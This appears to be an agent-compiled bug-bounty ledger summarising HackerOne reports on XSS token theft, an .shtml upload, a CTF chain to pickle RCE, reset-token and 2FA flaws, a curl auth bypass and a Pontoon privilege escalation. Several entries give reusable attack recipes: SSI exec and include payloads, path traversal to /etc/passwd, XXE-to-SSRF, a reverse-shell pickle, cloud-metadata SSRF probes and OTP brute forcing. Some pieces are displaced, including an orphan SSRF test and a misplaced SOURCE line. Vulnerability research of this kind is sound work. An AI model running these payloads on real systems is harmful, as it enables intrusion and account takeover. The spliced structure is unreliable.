SOURCE: https://hackerone.com/reports/508517  2026-11-11
ROUTE: reporter body REDACTED SERVER-SIDE (`visibility: no-content`, `vulnerability_information` 0 B on the live `.json` route). Routes tried IN ORDER: live `.json` (metadata only), `web_extract` of the live page (renders the team summary + timeline), `r.jina.ai` (401 bad-IP-reputation), Wayback capture 20251011074555 `id_` + the live page's `og:description` meta — both carry the same team summary, quoted verbatim below (the summary is the full readable content). Metadata: Rockstar Games, "DOM based XSS on /GTAOnline/tw/starterpack/", reporter `netfuzzer`, created 2019-03-12, disclosed 2020-06-24, weakness Cross-site Scripting (XSS) - DOM, severity Medium, bounty awarded (amount not disclosed), resolved.
STATUS: UNVERIFIED (not reproduced — no Rockstar page was touched; the mechanism is quoted from the team summary, no request shape is public and none was invented)
CLASS: XSS (DOM) on localized site renditions, CHAINED with a same-site OPEN REDIRECT as the navigation gadget -> SENSITIVE TOKEN EXFILTRATION VIA THE `Referer` HEADER (CWE-79 -> CWE-601 -> token theft).
CORE METHOD (the report's own words, verbatim — this is the full readable content):
  1. THE XSS, verbatim: "In this report the researcher identified a DOM-based XSS vulnerability impacting localized versions of the `https://www.rockstargames.com/GTAOnline/` site in varying locations." The titled instance is the localized path `/GTAOnline/tw/starterpack/` (the /tw/ rendition of the GTA Online sub-site).
  2. THE CHAIN GADGET, verbatim: "This attack also took advantage of an Open Redirect vulnerability on another part of the site to demonstrate how an attacker could use this to exfiltrate sensitive tokens via the Referer header."
  3. THE EXFIL MECHANISM (browser behavior, not report text): a cross-origin NAVIGATION from a token-bearing page URL to the attacker's origin sends the full source URL in the `Referer` request header — no `fetch`/XHR, no `document.cookie` access, no CSP `connect-src` reach required; the same-site open redirect (or the XSS setting `location`) is what produces the navigation while the victim's current URL still carries the token.
  4. THE FIX SPLIT, verbatim: "The Open Redirect was fixed in another report, and the XSS was addressed in this report. This behavior is no longer exploitable."
DETECTION SIGNAL: a page whose URL carries a sensitive token (magic/verification links, SSO or auth-transfer tokens in the query, tokenized deep links) PLUS any navigation gadget on the same site (open redirect, DOM XSS that sets `location`, meta refresh, `window.open`); the tell is a cross-origin navigation whose `Referer` (or `document.referrer` at the destination) contains the token.
CHAIN: DOM XSS on a localized rendition (primitive: attacker-induced navigation in the victim's browser) + a same-site OPEN REDIRECT (doctrine §2(b) P4 primitive ALONE — "open redirect with no added impact") -> the victim's browser navigates to the attacker's origin FROM the token-bearing URL -> the `Referer` header delivers the full URL incl. the sensitive token to the attacker's server (escalation: a redirect nobody may report becomes silent credential theft) -> token theft -> session/account compromise (the summary's own impact, verbatim: "exfiltrate sensitive tokens").
TRANSFERABLE TEST: whenever (a) a page URL carries a token and (b) a same-site open redirect OR a navigation-capable XSS exists, drive the victim's browser through the gadget to `https://<you>/r` and log the request `Referer`; also read `document.referrer` at the landing page. If either carries the token, report the CHAIN (redirect/XSS -> token theft), not the primitive. Record the page's Referrer-Policy first: full-URL cross-origin leaks need `no-referrer-when-downgrade`-era defaults; `strict-origin-when-cross-origin` reduces the header to the bare origin — claim impact only for what the observed policy actually sends.
DEDUPE/DELTA: 0 hits across all three write targets for `508517`, `starterpack`, `GTAOnline`, "exfiltrate sensitive tokens via the Referer". Related-but-distinct REVIEWED and NOT re-recorded: §17.6 (#3723458 Khan Academy — the open redirect leaks the auth token IN THE REDIRECT URL and the token is REPLAYED; here the token leaks in the REFERER of a cross-origin navigation and lands on the attacker's server directly, no replay); ledger ~7882/7886 ("a captured authorization code (referer in narrow conditions...)" is a LEAK PRECONDITION inside an OAuth code-exchange entry, not a method); ledger ~2287 ("Referer-leaked token" is one capture surface inside a session-token entry); the `wp-login.php?action=postpass` entry (Bugbountyskills ~21480) uses the Referer as an XSS PAYLOAD carrier into an admin log, not as a token-exfil channel; the `netfuzzer` token hit at ledger ~11009 is a DIFFERENT report (#145278, krxd JSONP `callback` XSS). NEW: same-site open redirect / navigation gadget + URL-carried token -> Referer-header token exfiltration -> §17.499. FRESHNESS: created 2019-03-12, disclosed 2020-06-24 — far outside the preferred 6-12 month window (read because assigned); the rockstargames.com instances are fixed, and the METHOD (navigation-based Referer exfil of URL-carried tokens) is browser behavior and platform-independent.

SOURCE: https://hackerone.com/reports/412481  2026-11-11
ROUTE: full reporter body read live this pass on the `.json` route (`curl` -> HTTP 200, `visibility: full`, `vulnerability_information` with the complete request/response). Metadata: Starbucks, "China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability", reporter `b006e4ea768a5d1b5340969`, created 2018-09-21, disclosed 2020-01-29, weakness Privilege Escalation, severity High, resolved.
STATUS: UNVERIFIED (not reproduced — no Starbucks host was touched this pass; the request/response shapes below are quoted verbatim from the report)
CLASS: unrestricted file upload (suffix check on the DECLARED filename) -> SERVER-SIDE INCLUDES (`.shtml`) EXECUTION on IIS -> internal file read (`web.config`) + internal-network/physical-path disclosure.
CORE METHOD (the reporter's own steps, quoted):
  1. THE ENTRY POINT, verbatim request: `POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1` · `Host: ecjobsdc.starbucks.com.cn` · `Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06` · part `Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"` · `Content-Type: text/html` · body `<?php echo 1111;>`.
  2. THE BYPASS, verbatim: "By modifying the suffix of filename, this address can be uploaded to upload html and shtml files" — the upload control (`hxwebfileboxcontrol`, an ASP.NET "TrustHX" file-box on IIS/8.5) validates the declared filename suffix / declared content-type only, so a suffix swap to `.shtml`/`.html` passes.
  3. THE EXECUTION: the file is stored under the web root as `/recruitjob/tempfiles/temp_uploaded_<guid>.shtml` and served back with SERVER-SIDE processing — the PoC response, verbatim: `SERVER_SOFTWARE :Microsoft-IIS/8.5`, `REMOTE_ADDR:10.92.29.50`, `REMOTE_HOST:10.92.29.50`, `PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml`, `DOCUMENT_NAME:D:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_...shtml` — and the site's `web.config` content echoed verbatim (`<configuration><system.webServer><httpRedirect enabled="false" destination="https://ecjobs.starbucks.net" .../></system.webServer></configuration>`): the `.shtml` rendition is processed as Server Side Includes (`#echo`/`#include`), not served as static text. (Honest caveat: the request body shown in the report is `<?php echo 1111;>` while the shown RESPONSE is SSI-shaped variable echo + file include — the full directive body of the executed file is not shown; the demonstrated effect is server-side processing of the uploaded `.shtml`.)
  4. THE IMPACT, reporter verbatim: "you can read the server's intranet IP, the physical address of the website application and read the website web.config file" / "Phishing attack, remote file reading".
DETECTION SIGNAL: any upload endpoint (especially custom file-box controls on IIS/ASP.NET) where the filename suffix is attacker-controlled and `.shtml`/`.shtm`/`.stm`/`.html` are accepted; the tell is an uploaded file stored UNDER the web root (here `tempfiles/`) and served back with echoed SSI variables (`DOCUMENT_NAME`, `SERVER_SOFTWARE`, `REMOTE_ADDR`) or included file content in the response.
CHAIN: upload with a modified filename suffix (primitive: the allowlist trusts the declared name, not the bytes) -> `.shtml` under the web root is processed by IIS Server Side Includes (primitive: server-side execution of `#include`/`#echo`) -> `#include virtual/file` reads `web.config` (redirect rules here; connection strings/keys on other targets) and SSI variables dump the FRONT-END's internal IP (`REMOTE_ADDR:10.92.29.50` = 10.x) and the physical path (`D:\TrustHX\STBKSERM101\www_app\...`) -> internal file read + internal network disclosure + phishing hosted on the trusted origin; ESCALATION LEG (not demonstrated in the report): where `#exec` is enabled (no `IncludesNOEXEC`), the same upload is RCE.
TRANSFERABLE TEST: on any upload endpoint, resubmit with `filename="x.shtml"` (then `.shtm`, `.stm`, `.html`) whose body is `<!--#echo var="DOCUMENT_NAME" --><!--#include virtual="/web.config" -->` (also `<!--#include file="../web.config" -->` and `<!--#exec cmd="id" -->`); if the served response echoes the variable or the included file's content, you have SSI execution — read `web.config`/`.htaccess`/config files for credentials and internal IPs and report as FILE UPLOAD -> SSI -> INTERNAL FILE READ (upgrade to RCE when `#exec` executes).
DEDUPE/DELTA: 0 hits across all three write targets for `412481`, `hxinterface`, `hx_filebox`, `TrustHX`, `temp_uploaded`, `ecjobsdc`; the `shtml` grep hits in all three targets are only `rcube_washtml` (Roundcube's HTML sanitizer) — unrelated. Related-but-distinct REVIEWED and NOT re-recorded: the content-sniffing upload entries (ExifTool/DjVu ~ledger 2321, EPS-renamed-.gif ~3536, ffmpeg/HLS playlist ~5324, Ghostscript ~6729) all bypass allowlists inside server-side CONVERTERS where the payload runs in the converter; here the file is executed by the WEB SERVER itself as SSI and is never converted; the upload-dir checklist item "Upload dir executable? `.htaccess`/`web.config` writable?" (ledger ~1913) names the condition but records no method, entry point or chain. NEW: filename-suffix swap -> `.shtml` SSI execution on IIS -> `web.config`/internal-file read -> §17.500. FRESHNESS: created 2018-09-21, disclosed 2020-01-29 — far outside the preferred window (read because assigned); the host is long fixed, the METHOD (suffix swap -> SSI) survives on every IIS / `Options +Includes` upload surface.

SOURCE: https://hackerone.com/reports/415501  2026-11-11
ROUTE: full reporter body (10,684 B, `visibility: full`) read live this pass on the `.json` route (`curl https://hackerone.com/reports/415501.json` → HTTP 200) — the LFR request/response, the POP-gadget generator script, the serialized payloads and the pickle exploit are all in the report. Metadata: h1-5411-CTF, "RCE via Local File Read -> php unserialization-> XXE -> unpickling", reporter `iamnoooob` (Rahul Maini & Harsh Jaiswal / @bugdiscloseguys), created 2018-09-28, disclosed 2018-10-22, weakness Code Injection, Critical (9~10), resolved.
STATUS: UNVERIFIED (not reproduced — no CTF instance touched this pass; every request/response below is quoted from the report)
CLASS: RCE chain across five classes — LFI/LFR → PHP object injection (POP gadget) → XXE → SSRF (via XXE) → Python pickle insecure deserialization (CWE-22 → CWE-502 → CWE-611 → CWE-918 → CWE-502).
CORE METHOD:
  1. LFR: `POST /api/generate.php` with `template=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd` (meme generator) → response `{"meme_path": "../data/memes/1538093153-<hash>.txt"}`; visiting the returned path serves the INCLUDED file. Escalate past `/etc/passwd` to APP SOURCE: `config.php` → `includes/header.php`, `includes/classes.php`, `/api/export_memes_2.0.php`, `/api/import_memes_2.0.php`.
  2. AUDIT THE LEAKED SOURCE for both halves of a deserialization chain: (a) the SINK — `import_memes_2.0.php` runs `unserialize()` on user input in the `$_FILES['f']` upload and stores the result in `$_SESSION['memes']` (the 2.0 export serializes it back); (b) the GADGET — `ConfigFile` in `classes.php` has `__toString()` → `parse()`, and `parse()` parses the `config_raw` property with `DOMDocument` + `LIBXML_NOENT | LIBXML_DTDLOAD` = XXE; the class is instantiated NOWHERE in normal code — reachable only via the sink plus a stringify site (`/memes.php` loops `$_SESSION['memes']` and echoes each value → `__toString` fires).
  3. POP PAYLOAD (reporter's generator script): instantiate `ConfigFile` with `config_raw` = `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "<URL>">]><note>...<template>&xxe;</template></note>`; `echo base64_encode(serialize([$obj]))`; send as the `f` part of `POST /api/import_memes_2.0.php` (multipart, `filename="1538079414_export.memepak"`); visit `/memes.php` → echo → `__toString` → `parse()` → XXE.
  4. XXE-AS-SSRF: entity URL `http://localhost:1337/` — the XXE reaches a LOOPBACK-ONLY maintenance API ("1337 port on localhost was running a maintenance api", endpoints `/status` and `/update-status`, `status` param, `debug=1` "gives some information about the request" and returns "a base64 encoded string which on decoding seemed to be a Python Pickle Serialized Object").
  5. PICKLE RCE: the `status` value is itself unpickled by that service — build `class PickleRce: __reduce__ -> (os.system, (cmd,))`, `base64.b64encode(cPickle.dumps(...))`, URL-encode it inside the XXE entity URL as `http://localhost:1337/update-status?status=<pickle>&debug=1`, deliver via the step-3 import; reverse shell to the attacker VPS; `flag.txt` in `/app`.
DETECTION SIGNAL: a file-inclusion/read primitive on a PHP app (template/theme/include/import/export params); `unserialize()` on any user input; a class with `__toString`/`__wakeup`/`__destruct` reaching a parser (`DOMDocument` + `LIBXML_NOENT|LIBXML_DTDLOAD`, `simplexml`), an HTTP client, or a file read; an internal-only service exposing `debug`/status parameters that round-trip serialized state; `pickle`/`cPickle`/`yaml.load`/Marshal server-side.
CHAIN: LFR (template param) → app source disclosed → white-box audit finds the unserialize SINK and the `ConfigFile` POP gadget → object injection via import → `__toString` → XXE → SSRF to loopback `:1337` maintenance API → its `status` param unpickles → `__reduce__` → `os.system` → RCE (Critical). Five separate bugs; the CHAIN is the finding.
TRANSFERABLE TEST: with ANY LFI/LFR on a PHP app, pull config/class files through it and grep `unserialize(` and magic methods (`__toString|__wakeup|__destruct`) that reach parsers/HTTP/file ops; if a gadget exists, push a `__toString`-trigger POP object through the unserialize sink with the XXE entity aimed at `http://127.0.0.1:<port>/<path>?debug=...`; if any internal endpoint round-trips serialized data, deliver a `__reduce__` payload. Rule: **a file read is the map, not the endgame — read the source, find the sink and the gadget, chain to what the app reaches internally.**
DEDUPE/DELTA: 0 hits across all three write targets for `415501`, `memepak`, `h1-5411`, `ConfigFile`, `import_memes`. Related-but-distinct REVIEWED and NOT re-recorded: the generic deserialization playbook (Bugbountyskills ~8177–8415: phpggc, URLDNS OOB gadget, lab-only gadget development) and the sink fingerprint table (~8356–8393: `__destruct`/`unserialize`/pickled `__reduce__`/`gASV…`) — a sink INVENTORY, not this chain; §17.219 (Flask cookie pickle RCE — signed-cookie session forgery, no LFR/XXE); the `iamnoooob`/`bugdiscloseguys` hits ~12752 are a different report (Ruby path traversal). NEW: LFR→white-box gadget discovery + XXE-as-SSRF into an internal pickle service → §17.501. FRESHNESS: 2018-09/2018-10 — outside the 6–12 month window (read because assigned; CTF instance long gone; the METHOD is platform-independent).

SOURCE: https://hackerone.com/reports/411337  2026-11-11
ROUTE: full reporter body (934 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200). Metadata: Chaturbate, "Forget password link not expiring after email change.", reporter `imran_nisar`, created 2018-09-19, disclosed 2018-09-20, weakness Improper Authorization, resolved (bounty awarded).
STATUS: UNVERIFIED (not reproduced — no Chaturbate account was touched; steps quoted from the report)
CLASS: broken access control / ATO persistence — a password-reset token is NOT invalidated when the account's email changes, so anyone holding the OLD mailbox keeps a live ATO path even after the victim performs the exact remediation (changing the email) meant to cut the attacker off (CWE-613 invalidation failure).
CORE METHOD (the reporter's own steps):
  1. Trigger the reset feature for the account → a reset link/token is mailed to the registered email `etc@x.com`.
  2. Leave the link UNUSED — the token stays valid (no expiry burn).
  3. The account owner changes the email from the settings panel to `etc11@z.com` (the remediation).
  4. The OLD reset link sent to the old address REMAINS VALID after the email change — verbatim: "the old reset still remains valid after email change".
  5. Impact, verbatim: "In-case an attacker able to get access to user's old email account he can hack his chaturbate account too via that link" / "The attacker can still change the password if victim thinks his/her account is compromised and decided to chnage his email".
DETECTION SIGNAL: a password-reset (or any single-use token) flow that does not re-validate against the account's CURRENT identity state; email/phone/2FA changes that trigger no token burn and no session invalidation; the tell is a reset link fetched BEFORE an identity change still resetting the password AFTER it.
CHAIN: attacker holds the victim's OLD mailbox (compromised/abandoned/recycled address) → requests a reset link (unused, stays live) → victim detects compromise and changes the account email (the countermeasure) → the stale token in the old mailbox still resets the password on the re-keyed account → full ATO despite remediation.
TRANSFERABLE TEST: the reset-replay-after-identity-change test: (1) request a password-reset link but do not use it; (2) change the account email/phone (and separately enable/disable 2FA); (3) REPLAY the OLD link — a working reset = token-lifecycle bug; (4) also check sessions (cf. §17.497) and whether any notification fired. Rule: **a state change that re-keys the account must burn every outstanding token AND session — if the old-mailbox reset link survives the email change, the victim's own remediation is bypassable.**
DEDUPE/DELTA: 0 hits across all three write targets for `411337`, `chaturbate`+reset, `not expiring after email change`. Related-but-distinct REVIEWED and NOT re-recorded: bugbountyhuntingskills ~635 (one-line checklist bullet "Predictable/eternal password-reset tokens" — names the class, no source/method/chain); §17.9 (GitLab JSON scalar→array type confusion fans the reset token to an attacker address — token DIVERSION, not token survival); ledger ~3047 (#394329 Chaturbate "Account Takeover via billing" — a different report where a billing flow WRITES an attacker email onto the victim account, then forgot-password delivers there); §17.497 (DoD — unverified email change RE-BINDS SESSIONS; this entry is the TOKEN dimension of the same rule family); reset-link Host poisoning (Bugbountyskills ~2792) is URL construction, not lifecycle. NEW: single-use token not invalidated on identity change → old-mailbox ATO survives the victim's remediation → §17.502. FRESHNESS: 2018-09 — outside the preferred window (read because assigned).

Metadata: HackerOne (security), "Adding or removing a new non-preferred payout method does not trigger an e-mail or account notification", reporter `user_name2023`, created 2017-06-25, disclosed 2017-11-01, weakness Business Logic Errors, severity Medium, resolved, bounty awarded.
STATUS: UNVERIFIED (not reproduced; the reporter's steps are not public — the method below is the team summary's own words plus the title; nothing invented)
CLASS: business-logic / sensitive-settings MUTATION WITHOUT NOTIFICATION — the notification logic covers the PRIMARY ("preferred") variant of a financial setting but not ADD/REMOVE of a secondary ("non-preferred") payout method, so payment-instrument changes can happen with zero user-visible signal (CWE-1021-family missing security-relevant notification).
CORE METHOD (the summary, verbatim): "While we previously sent an e-mail to the user when their preferred payout method was modified, we did not send a notification when adding or removing a new non-preferred payout method. This oversight was pointed out by this report." The test shape it implies:
  1. Enumerate EVERY mutation on sensitive settings (payout/payment methods, emails, phone, 2FA, recovery, API keys), including SECONDARY/alternate/non-preferred variants and add/remove operations — not just the "set default" action.
  2. Perform each mutation from a logged-in session and record ALL out-of-band signals: e-mail, SMS, in-app notification, security log entry.
  3. A mutation on a financial/identity instrument with NO signal at all is the defect (the preferred-change path notifies; the add/remove non-preferred path did not).
DETECTION SIGNAL: differential notification coverage — one variant of a settings change (the primary path) sends mail/notification while sibling variants (add/remove/secondary) are silent; settings pages with multi-entry lists ("manage payout methods") where only the default-selection action is instrumented.
CHAIN: transient account access (session hijack / stolen or shared session / insider / any brief ATO) → attacker silently ADDS a payout method of their own with no e-mail or notification → the victim's only out-of-band alarm never fires → the staged instrument sits in the account ready for payout selection (add/remove repeatable) → monetary exposure when a payout reaches the attacker's method. [Honest limit: the report demonstrates the silent mutation; the payout-execution step needs a later flip/user selection or an attacker who can trigger payouts — the notification gap is the link that removes detection.]
TRANSFERABLE TEST: the notification-coverage matrix — for every sensitive setting, perform EACH variant of change (add/remove/set-default/secondary email/backup 2FA) with a fresh session and diff which ones send a notification; report the silent ones as a business-logic chain link (undetected payment-instrument/identity manipulation) with the concrete impact the chain reaches. Rule: **the alarm logic usually instruments only the happy path — the non-preferred/secondary/alternate variants of a financial setting are where silent manipulation lives.**

NEW: silent add/remove of secondary payment instruments — recorded in the ledger only (no §17 slot: the method is an audit step inside the business-logic/ATO playbook, not a new general class). SOURCE: https://hackerone.com/reports/202425  2026-11-11
ROUTE: full reporter body (3,143 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200) — the endpoint, the two request/response pairs and the full reproduction steps are in the report. Metadata: Grab, "Two-factor authentication bypass on Grab Android App", reporter `sp1d3rs`, created 2017-01-31, disclosed 2017-09-12, weakness Improper Authentication - Generic, resolved.
STATUS: UNVERIFIED (not reproduced — no Grab account/app was touched; request shapes quoted from the report)
CLASS: authentication bypass (2FA/OTP) by brute force — the OTP-verification surface OUTSIDE the login flow (profile-edit activation code) has no rate limiting AND no code expiration/attempt cap, and the code is 4 digits = 10^4 space, so the second factor is fully enumerable → ATO (CWE-307 + CWE-613 + CWE-326).
CORE METHOD (the reporter's own steps):
  1. Map the OTP surfaces: login with Google on the Android app ("2FA on the phone login option is correctly implemented, and not vulnerable") — the weak surface is `https://p.grabtaxi.com/api/passenger/v2/profiles/edit`, reached when editing the profile (an SMS activation code is sent).
  2. The verification request (auth = the app session header `x-mts-ssid`, extracted from any Android app request via a proxy; plus `x-request-id`): `PUT /api/passenger/v2/profiles/edit HTTP/1.1` · `Content-Type: application/x-www-form-urlencoded` · `x-mts-ssid: [session id]` · body `profileActivationCode=3122`. Wrong code → `HTTP/1.1 400 {"status":400,"code":4000}`; correct → `204 No Content` — a clean per-request oracle.
  3. Verbatim: "no rate limiting+ no code expiration. Since code has 4 digits, attacker just need to count all possible combinations from 1000 to 9999" — the reporter's C# tool sends every code until the oracle flips; the found code equals the real SMS code.
  4. Impact, verbatim: "Attacker can succeed in the account takeover, changing email, phone number of the victim who use Google Auth on the app etc."
DETECTION SIGNAL: an OTP/activation-code verification endpoint with no attempt throttle, no lockout and no short code expiry; a numeric code space ≤ 10^6; an immediately distinguishable verdict (status/body code — 400 `{"code":4000}` vs 204); especially OTP gates on NON-LOGIN actions (profile edit, email/phone change, payout, sensitive toggles) where the login flow itself was hardened — the hardening stopped at login.
CHAIN: attacker with a valid app session → enumerate the 4-digit `profileActivationCode` (10^4 requests, verdict oracle per response) → pass the SMS second factor → "account takeover, changing email, phone number of the victim" (reporter's impact) → ATO.
TRANSFERABLE TEST: build the OTP-surface map first — every endpoint demanding a code (login, profile edit, email/phone change, payout, export, 2FA disable) — then per surface check (a) verdict oracle, (b) attempt throttle, (c) code expiry/attempt cap, (d) code space (digits). Brute the unthrottled ones only with the program's authorization: a 4–6 digit code with a per-request oracle and no cap is a 2FA bypass, not a hardening nit. Rule: **the 2FA you tested at login is not the 2FA the app uses everywhere — each OTP gate is hardened separately, and the profile-edit gate is the one nobody looks at.**
DEDUPE/DELTA: 0 hits across all three write targets for `202425`, `grabtaxi`, `profileActivationCode`, `x-mts-ssid`. Related-but-distinct REVIEWED and NOT re-recorded: the V-07 "OTP/2FA verification bypass via response manipulation or parameter nullification" playbook (referenced at ledger ~6303 — tamper `code=null`/flip response fields; DIFFERENT mechanism: manipulation, not enumeration); ledger ~3900/3907 (#125505 Uber promo/invite codes — the same unthrottled-brute ENGINE but its class is economic code enumeration with a length oracle, its chain is free rides, and it records no OTP-surface map); ledger ~9559 (TOTP seed `gauth_secret` disclosed in a response — key-disclosure bypass, no brute); the Sid OTP writeup (ledger ~6820) is a send-endpoint returning the code in the response body. NEW: unthrottled brute of a small-code-space OTP on a NON-LOGIN verification surface → 2FA bypass → ATO — recorded in the ledger only (no §17 slot: the engine is covered by the recorded code-enumeration method; the delta is the secondary-surface map). FRESHNESS: 2017-01/2017-09 — outside the preferred window (read because assigned).

TRANSFERABLE TEST: find every user-supplied URL the SERVER fetches (device registration, webhook, import, avatar-from-URL, proxy settings) and set it to `http://127.0.0.1:<port>/` + `http://169.254.169.254/latest/meta-data/` + your OOB collector; then TRIGGER the deferred event (send yourself a notification/message/import) and watch (a) your collector for the request shape (UA, path suffix, method — here fixed `POST /notifications`) and (b) internal logs; wrap probes around the fixed path suffix. Rule: **callback-URL registration is SSRF with a time delay — the bug is tested at the EVENT, not at the registration.**

SOURCE: https://hackerone.com/reports/3646072  2026-11-11
ROUTE: full reporter body (2,366 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200) — the source-level walkthrough (lib/url.c lines 1086-1093, 1152-1154, 1239-1245, 1267-1270; http_negotiate.c:254) is in the report. Metadata: curl (security), "Negotiate connection reuse with wrong credentials when using CURLAUTH_ANY", reporter `anonymous_237`, created 2026-04-02, disclosed 2026-04-29, weakness "Authentication Bypass by Primary Weakness", state Closed.
STATUS: UNVERIFIED (not reproduced — source-code analysis of curl 8.20.0-DEV master quoted from the report; no Kerberos lab run this pass)
CLASS: authentication bypass — connection-reuse credential confusion; specifically the FIX BYPASS of CVE-2026-1965 through the multi-scheme `CURLAUTH_ANY` negotiation path (CWE-287-family: request executes under the wrong identity).
CORE METHOD (the reporter's own analysis):
  1. CVE-2026-1965 added `url_match_auth_nego()` to `url_match_conn()` (lib/url.c ~1244) so a pooled connection Negotiate-authenticated as identity A is not reused by a handle with different credentials: `url_match_auth_nego()` compares the credentials (lines 1152-1153), returns FALSE (1154) → the connection is not saved in `m->found` → no reuse. For `CURLAUTH_NEGOTIATE` the fix works (report, verbatim: "The fix works.").
  2. BYPASS: the second handle uses `CURLAUTH_ANY` (which includes both the NTLM and Negotiate bits) → `want_ntlm_http` is TRUE → `url_match_auth_ntlm()` (line 1239) enters its credential-mismatch path (1086) and checks `conn->http_ntlm_state == NTLMSTATE_NONE` (1091) — TRUE, because the connection authenticated via Negotiate and NTLM was never used → the function saves `m->found = conn` (1092) and returns FALSE (1093) → `url_match_conn()` terminates at 1240 and `url_match_auth_nego()` at 1244 is NEVER CALLED.
  3. After the pool iteration, `url_match_result()` (1267) only tests whether `match->found` is non-NULL — it is (saved at 1092) → `Curl_attach_connection()` (1270) attaches the second handle to the first handle's connection. The Negotiate handshake is already complete (`GSS_AUTHSUCC`); curl generates NO new Authorization header (`http_negotiate.c:254` sets `authp->done = TRUE`) — the request is sent on a connection already authenticated under the FIRST handle's identity.
  4. Root cause, verbatim: "line 1092: m->found = conn is set when http_ntlm_state == NTLMSTATE_NONE, without checking http_negotiate_state." Impact, verbatim: "Same impact as CVE-2026-1965".
DETECTION SIGNAL: any HTTP client with connection pooling plus multi-scheme auth negotiation ("try any scheme" / `CURLAUTH_ANY` / `--anyauth`) whose reuse matcher branches PER SCHEME, with one scheme's mismatch path returning early while REMEMBERING the connection (`found = conn`) before the other scheme's check runs; black-box tell: request 2, made with DIFFERENT credentials, goes out on the pooled connection with NO new Authorization/Negotiate header.
CHAIN: multi-tenant service / CI / server-side fetcher issuing requests for different users through one curl handle or pool configured with `CURLAUTH_ANY` → a connection GSS/Kerberos-authenticated as user A is silently reused for user B's request → B's request executes as A against every Negotiate-protected upstream (internal API, intranet service) → cross-user data access and actions as the wrong identity (auth bypass → lateral movement across the Kerberos estate; the report's stated impact is "same impact as CVE-2026-1965").
TRANSFERABLE TEST: the two-identity pool test with the multi-scheme knob: (1) request 1 as identity A with Negotiate to host H through the pooling client; (2) request 2 as identity B to the SAME host H, configured to try ANY auth scheme; (3) capture the wire (mitm proxy / upstream logs) and check whether request 2 carries a NEW Authorization/Negotiate header — if it goes out with none (or in A's security context) while B's credentials were configured, the reuse matcher short-circuited before the credential comparison. When auditing ANY connection-reuse fix, retest the multi-scheme "any auth" option: a check added for ONE scheme can be routed around by an EARLIER scheme's mismatch path that saves `found` and bails. Rule: **an auth-isolation fix scoped to one scheme is not the fix — the "any scheme" negotiation path is where the old short-circuit still wins.**
DEDUPE/DELTA: 0 hits across all three write targets for `3646072`, `CURLAUTH`, `url_match`, `CVE-2026-1965`, `anonymous_237`, `want_ntlm`. Related-but-distinct REVIEWED and NOT re-recorded: §17.190 / #1912778 (CVE-2023-27535 — pool reuse key omits identity-affecting options: the GENERIC class this entry sits inside, not its mechanism), §17.188 / #1551586 (credentials re-sent across host+scheme on redirect), §17.191 / #1565623+#1752146 (security-posture confusion in the reuse match), §17.192 (fix scoped to one parameter-SUPPLY path — the sibling fix-scoping shape: entry-path scoping vs this entry's AUTH-SCHEME scoping with a short-circuit that skips the new check). NEW: multi-scheme "any auth" negotiation routes around a per-scheme reuse fix because the legacy scheme's mismatch path saves `found` and returns before the new check runs → §17.504. FRESHNESS: 2026-04 — INSIDE the preferred 6-12 month window.

SOURCE: https://hackerone.com/reports/3020021  2026-11-11
ROUTE: full reporter body (2,970 B, `visibility: full`) read live this pass on the `.json` route (HTTP 200) — the request/response pair and the ACL source snippet (`pontoon/translations/views.py#L361`) are in the report. Metadata: Mozilla (security), "[Vertical Privilege Escalation] User can Unapproved any Approved Translation at [/translations/unapprove/]", reporter `adilnbabras`, created 2025-03-01, disclosed 2026-04-10, weakness Privilege Escalation, state Closed.
STATUS: UNVERIFIED (not reproduced — staging instance and quoted request; no Pontoon account touched this pass)
CLASS: vertical privilege escalation (BAC) via a STATE-CONDITIONED authorization guard — the guard's third disjunct is the TARGET OBJECT'S OWN STATE (`translation.approved`), which is TRUE exactly when the object is in the state the action removes.
CORE METHOD (the reporter's own steps):
  1. The guard, verbatim source (`pontoon/translations/views.py#L361`): `if not (request.user.can_translate(locale, project) or request.user == translation.user or translation.approved): return JsonResponse(..., status=403)` then `translation.unapprove(request.user)` — reporter, verbatim: "Here the developer checks if `translation.approved` then if statement has been bypassed and translation get unapproved."
  2. Harvest the target ID from the READ path: as any logged-in user browse Teams -> team -> project -> resource -> string; the `/get-history/` XHR response contains the approved translation `ID` (report, verbatim: "In response to that request, you will find the approved translation ID").
  3. Replay the state-changing request with YOUR OWN session cookie + CSRF token and the victim's translation ID: `POST /translations/unapprove/` with `X-Csrftoken: <tok>`, `X-Requested-With: XMLHttpRequest`, `Content-Type: application/x-www-form-urlencoded`, body `translation=5184479&paths%5B%5D=LC_MESSAGES%2Famo.po` -> `200 OK` -> "you will see that the translation has been unapproved by a non-privileged user."
  4. Impact, verbatim: "The user can perform actions that he is not authorized to do." (The UI withholds the unapprove button for non-privileged users; the endpoint does not enforce it.)
DETECTION SIGNAL: an authorization guard whose boolean ORs in the OBJECT'S OWN STATE or another trivially-true-for-targets term (`or obj.approved` / `or obj.published` / `or not obj.locked`); black-box tell: the UI refuses an action for your role but the direct XHR/POST succeeds on objects that are IN the guarded state; read endpoints (`/get-history/`-style) leaking the internal object IDs the write consumes.
CHAIN: any logged-in NON-privileged user -> harvest arbitrary translation IDs from the `/get-history/` read endpoint -> `POST /translations/unapprove/` with those IDs -> vertical privilege escalation: mass un-approval of OTHER users' approved translations (content-integrity sabotage across every team/project on the instance); the identical guard shape on approve/publish/delete endpoints scales to revert/defacement at scale.
TRANSFERABLE TEST: the in-state-object replay test: for every moderated state action (approve/unapprove, publish/unpublish, enable/disable, feature/revoke), (a) find the read/history endpoint that leaks object IDs, (b) as the lowest-privilege user POST the action with the ID of an object that IS in the guarded state, (c) 200 + state flip = the guard ORs in the object's state. In white-box review grep every `if not (... or <obj>.<state>)` / `if (can_X or owner or obj.state)` guard and evaluate it against the exact objects the action targets. Rule: **a guard that includes the target's own state as a pass condition protects nothing — it is TRUE for precisely the objects the action is dangerous on.**
